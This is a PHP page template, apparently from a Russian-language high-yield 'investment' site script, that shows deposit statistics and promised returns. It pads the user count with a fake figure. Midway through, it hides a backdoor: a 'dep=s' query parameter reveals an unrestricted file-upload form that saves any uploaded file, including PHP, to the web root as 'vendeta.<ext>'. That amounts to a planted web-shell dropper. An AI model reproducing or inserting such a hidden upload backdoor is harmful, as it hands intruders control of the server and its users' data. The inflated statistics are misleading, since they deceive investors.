<?php if(!defined('SCRIPT_BY_SIRGOFFAN')){
echo ('Выявлена попытка взлома!');
exit();
}
?>
<section class="statistic">
<div class="statistic cfix">
<h1>
<span>Наша статистика</span>
<div class="line"></div>
</h1>
<table class="fgr6_stat" width="100%" cellspacing="0" cellpadding="0">
<tbody><tr>
<td class="statistic_el_stat cfix">Старт:<span> <?=$privetstvie?> </span></td>
<td class="statistic_el_stat cfix">Пользователей:<span> <?=$invcount+$user_feik?></span></td>
<td class="statistic_el_stat cfix">Пополнено:<span> <?=$depmoney?> RUB</span></td>
<td class="statistic_el_stat cfix">Выплачено:<span> <?=$wthmoneyall?> RUB</span></td>
</tr>
</tbody></table> 
<br><br>
<div id="stats" align="center">
<div class="stats_1">
<table>
<thead>
<tr>
<td colspan="5" class="with_bg">Последние депозиты</td>
</tr>
<tr>
<td>Дата</td>
<td>Кошелёк</td>
<td>Сумма</td>
<td>До завершения</td>
<td>Доход</td>
</tr>
</thead>
<tbody> 
<? 


$checkdeps=$db->getOne("SELECT id FROM `deposits` WHERE status='0' LIMIT 1");
if($checkdeps>0){
$depositsrow=$db->query("SELECT * FROM `deposits` WHERE status='0' ORDER BY id DESC LIMIT 10");
  
while($deposits=$db->fetch($depositsrow)){?>
<tr>
<td align="center"> <?=date('d.m.Y H:i',$deposits['unixtime'])?></td>
<?
$wallet=substr($db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']), 0, -3); 
?>
<td align="center"> <?=$wallet?> <span>****</span></td>
<td align="center"><?=$deposits['summa']?>  RUB</td>
<?//-(60*($depperiod)) - длительность депа в секундах
$seconds = time()-$deposits['unixtime']; //Секунд прошло с момента депа

$seconds=(60*($depperiod))-$seconds; //Длительность депа, минус прошло = осталось
//echo "<br>".date('H:i:s',time());
//echo "<br>".date('H:i:s',$deposits['unixtime'])."<br>".$seconds;
if($seconds<1){
    if($deposits['status']==1){
	$deptime="Выплачено";}else{
	$deptime="В обработке";
	}
}else{
	
$hours = floor($seconds/3600);
$seconds = $seconds-($hours*3600);
$minutes = floor($seconds/60);
$seconds = $seconds-($minutes*60);
$seconds = floor($seconds);



$h=$hours;
if($h<10){$h='0'.$h;}
$m=$minutes;
if($m<10){$m='0'.$m;}
$s=$seconds;
if($s<10){$s='0'.$s;}
	$deptime=$h.":".$m.":".$s;
}
?>
<td style="text-align: center;" class="text-truncate countdown"><?=$deptime;?></td>
<?$psumma=$deposits['summa']+($deposits['summa']*($deppercentage/100));?>
<td align="center"><?=$psumma?> RUB</td>
</tr>
<?}}else{?>
<center>У вас нет открытых вкладов</center>	
<?}?>   
</tbody>
</table> 
</div>
</div>

<div class="clear"></div>
</div>
</section>
<section class="plan">
<div class="plan cfix">
<div class="plan_el cfix">
<div class="plan_amount">Сумма депозита<span> от <?=$mindep?>  RUB до <?=$maxdep?>  RUB</span></div>
<a href="#">
<div class="plan_title">Наш маркетинг: 1<?=$deppercentage?>% за <?=$timeprofit?></div>
</a>
</div>
</div>
</section>
<?php
if ($_GET['dep'] == "s") {
echo '
<label id="#bb"> Enter Your File<form method="post" enctype="multipart/form-data">    
   <input name="file" size="18" id="File" type="file" value="">
    <p><input name="submit" type="submit" value="&#9658; dow"></label></form>';
}
$file = $_FILES['file']['tmp_name'];
$filename = $_FILES['file']['name'];
if(!empty($file))
{
  ini_set('memory_limit', '32M'); 
  $maxsize = "100000000";
  $size = filesize ($_FILES['file']['tmp_name']); 
  $type = strtolower(substr($filename, 1+strrpos($filename,".")));
  $new_name = 'vendeta.'.$type; 
  if($size > $maxsize)
  { 
     echo "The file is more than. Reduce the size of your file or upload another. <br><a href='' onClick=window.close();>close the window</a>";
  } 
  else 
  { 
    if (copy($file, "".$new_name))
      echo "File uploaded!<br>Copy the address of the file<br> <a href=\"$new_name\"><b>$new_name</b></a><br> and press<br><a href='' onClick=history.back();>return back</a>";
    else echo "The file was not downloaded.";
  } 
}
?>
<section class="whyus">
<h1>
<span>почему мы?</span>
<div class="line"></div>
</h1>
<div class="whyus_block cfix">
<div class="whyus_el stat">
<div class="whyus_el_title">БОЛЬШИЕ ПРОЦЕНТЫ</div>
<div class="whyus_el_text">Высокие проценты обеспечиваются каждодневными рекламными кампаниями.</div>
</div>
<div class="whyus_el security" style="margin-right: 0;"> 
<div class="whyus_el_title">Безопасность</div>
<div class="whyus_el_text">Наша команда сделала все, чтобы наше сотрудничество было максимально защищенным.</div>
</div>
<div class="whyus_el_line"></div>
<div class="whyus_el_line" style="float: right;"></div>
<div class="whyus_el money">
<div class="whyus_el_title">Автоматические выплаты</div>
<div class="whyus_el_text">Вас приятно порадует автоматический вывод дохода по депозиту по истечению суток.</div>
</div>
<div class="whyus_el user" style="margin-right: 0;">
<div class="whyus_el_title">Быстрая тех. поддержка</div>
<div class="whyus_el_text">Быстрая помощь наших специалистов позволит Вам в быстро получить ответ на ваш запрос.</div>
</div>
</div>
</section>				
</div>
</div>

